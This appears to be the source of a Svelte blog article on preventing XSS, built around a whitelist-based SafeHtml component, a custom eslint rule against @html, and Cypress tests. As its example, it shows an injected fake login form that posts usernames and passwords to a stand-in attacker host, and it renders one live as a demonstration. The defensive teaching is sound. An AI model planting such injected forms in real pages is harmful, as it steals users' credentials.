<script>
  import Code from "components/Code.svelte"
  import SafeHtml from 'components/articles/code-examples/SafeHtml.txt'
  import CustomSvelteEslintPlugin from 'components/articles/code-examples/CustomSvelteEslintPlugin.txt'
  import SafeHtmlCypressTests from 'components/articles/code-examples/SafeHtmlCypressTests.txt'
</script>

<h2>Summary</h2>
<ul>
  <li>
    Create a component called <kbd>&lt;SafeHtml</kbd> that only allows whitelisted 
    html elements, attributes, and inline style properties.
  </li>
  <li>Replace usages of <kbd>@html</kbd> with our new <kbd>SafeHtml</kbd> component instead.</li>
  <li>Add a custom svelte lint rule, so we don't have to remember to use <kbd>SafeHtml</kbd> instead of <kbd>@html</kbd>.</li>
  <li>And add cypress component tests to assert <kbd>SafeHtml</kbd> does what it's supposed to do.</li>
</ul>

<h2>XSS explanation and example</h2>

<p>Svelte, like other front-end frameworks, gives the ability to plop a dynamic string of html into the DOM.</p>

<Code value={`...
{@html "<h1>I am html from your database.</h1>"}
...`} />

<p>
  This can be handy if you want to give users a WYSIWYG editor to make dynamic 
  rich content to display on your site. But if you give them that kind of power, you want to limit it, so you don't end up showing something like:
</p>

<Code value={`...
{@html \`
  <p>Pleas login again</p>
  <form action="https://maliciousnastyboy.com">
    <input placeholder="username" />
    <input placeholder="password" />
    <button type="submit">Login</button>
  <form>
\`}
...`} />

<p>
  And you'll of course see:
</p>

<p>    
  {@html `
    <p>Pleas login again (DON'T THO)</p>
    <form action="https://johnschottler.com">
      <input placeholder="username" />
      <input placeholder="password" />
      <button type="submit">Login</button>
    <form>
  `}
</p>

<p>
  That form is pretty obviously <em>not</em> something you should fill in with real un/pw combo.
  It'd be more convincing if it was also be styled to look <em>exactly</em> like your site's login page. 
  If it was done well enough, that could even fool a technical person who knows how XSS attacks can work if they're just going about their business.
  The attacker could use an inline style attribute using <kbd>z-index/position/height/width/etc</kbd>, so the form takes up the entire page and looks more 
  legitimate.
</p>

<p>
  React even has a method called <kbd>dangerouslySetInnerHTML</kbd> to remind devs 
  to think about these kind of scenarios when they set an html string into the DOM.
</p>

<h2>SafeHtml.svelte</h2>
<p>
  Your site may have different needs, so only open up html syntax that it will need. And think about how <em>those</em> whitelisted elements could still be used for XSS attacks.
</p>

<Code title="SafeHtml.svelte" maxHeight="30rem" value={SafeHtml} />

<h2>Custom eslint rule</h2>
<p>
  We don't want to have to remember to not use <kbd>@html</kbd>, so 
  let's enforce using <kbd>SafeHtml</kbd> instead of <kbd>@html</kbd> it at the lint level, before our 
  tests even get run, before it'd ever have a chance to get into any of our environments.
</p>

<p>
  To make a custom svelte eslint rule in addition to what 
  <a href="https://github.com/sveltejs/eslint-plugin-svelte3" target="_blank">eslint-plugin-svelte3</a> does for us
  would require an article of it's own, which I'll probably do. So I'll just keep this fairly highlevel here.
</p>

<ul>
  <li>
    Create a simple eslint-plugin in your site's repo and setup <kbd>npm</kbd> to install it as a local dev package with <kbd>npm i -D file:./eslint-plugin-mySite</kbd>, 
    like this guy does in <a target="_blank" href="https://www.webiny.com/blog/create-custom-eslint-rules-in-2-minutes-e3d41cb6a9a0">this article</a>.
  </li>
  <li>
    But in your <kbd>index.js</kbd>, make a "processor" eslint plugin that basically inherits 
    from <kbd>eslint-plugin-svelte3</kbd> so you can get access to svelte's abstract syntax tree (AST) for your components like:
    <br/><br/>
    <Code title="Custom eslint plugin for svelte" maxHeight="30rem" value={CustomSvelteEslintPlugin} />
  </li>
</ul>

<h2>Cypress component tests</h2>
<p>
  Additionally, we want to make sure our <kbd>SafeHtml</kbd> does what it's supposed 
  to do, so we can modify it going forward with less concern about breaking it or re-opening up for an attack by accident.
</p>
<p>Again, testing with Cypress is an article of it's own that I'll probably write in the future, but here are some tests we could do:</p>

<p><img src="/images/SafeHtml-cypress-component-tests.jpg" alt="SafeHtml-cypress-component-tests.jpg" /></p>

<Code title="SafeHtml.spec.js" value={SafeHtmlCypressTests} />

<p>Now, even if your backend isn't html encoding or cleaning html strings on the way into the db, your front-end should handle it just fine!</p>
